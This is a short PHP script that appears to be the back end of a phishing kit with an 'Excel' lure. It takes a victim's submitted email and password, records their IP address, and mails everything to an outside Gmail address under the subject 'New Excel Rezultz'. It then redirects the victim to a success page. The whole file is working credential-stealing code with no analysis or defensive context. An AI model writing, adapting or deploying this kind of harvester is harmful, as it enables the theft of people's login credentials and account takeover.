<?

$ip = getenv("REMOTE_ADDR");
$message .= "+++++++++++++ECR++++++++++++\n";
$message .= "Email: ".$_POST['mylove']."\n";
$message .= "Pa55word: ".$_POST['mylover']."\n";
$message .= "++++++++++++++++IP and Date+++++++++++++++\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "+++++++++++ECR+++++++++++\n";
$recipient = "vitocorleon419@gmail.com";
$subject = "New Excel Rezultz";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
     mail("$to","$subject", $message);
         mail($recipient,$subject,$message,$headers);

       {
           header("Location: success.php");

       }

?>